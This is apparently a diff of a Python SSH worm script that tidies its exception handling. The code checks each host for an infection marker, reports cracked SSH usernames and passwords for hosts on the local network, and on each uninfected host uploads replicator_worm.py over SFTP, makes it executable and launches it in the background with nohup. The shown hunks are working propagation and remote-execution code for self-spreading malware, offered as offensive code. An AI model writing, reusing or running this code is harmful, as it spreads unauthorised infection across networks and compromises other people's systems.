@@ -37,7 +37,7 @@ def isInfected(sshC):
         sftpClient.stat(INFECTION_MARKER)
         infected = True
          
-    except IOError, e:
+    except IOError:
         print("This system is not Infected ")   
  
     return infected    
@@ -74,14 +74,11 @@ def getHostsOnTheSameNetwork():
 def exploitTarget(ssh):
     print("Expoiting Target System")
     sftpClient = ssh.open_sftp()
-    try:
-        sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
-        ssh.exec_command("chmod a+x /tmp/replicator_worm.py")
-        ssh.exec_command("nohup python -u /tmp/replicator_worm.py > /tmp/worm.output &")
-	print("Infected this system sucessfully !! ;)")
-    except e:
-        print("Failed to Execute worm")
-	print(e)
+    sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
+    ssh.exec_command("chmod a+x /tmp/replicator_worm.py")
+    ssh.exec_command("nohup python -u /tmp/replicator_worm.py > /tmp/worm.output &")
+    print("Infected this system sucessfully !! ;)")
+
  
  
 ##############################################
@@ -136,15 +133,20 @@ for host in discoveredHosts:
         if ssh:
             print("Successfully cracked Username and password of "+host)
             if not isInfected(ssh):
-                exploitTarget(ssh)
-                ssh.close()
-                break
+		try:
+                    exploitTarget(ssh)
+                    ssh.close()
+                    break
+		except:
+		    print("Failed to execute worm")
+    		    print("---------------------")	
+		    continue
             else:
                 print(host + " is already infected")
     except socket.error:
         print("System no longer Up !")
     except paramiko.ssh_exception.AuthenticationException:
         print("Wrong Credentials")
-    print("---------------------")
  
+    print("---------------------")
 print("I am done now !!")
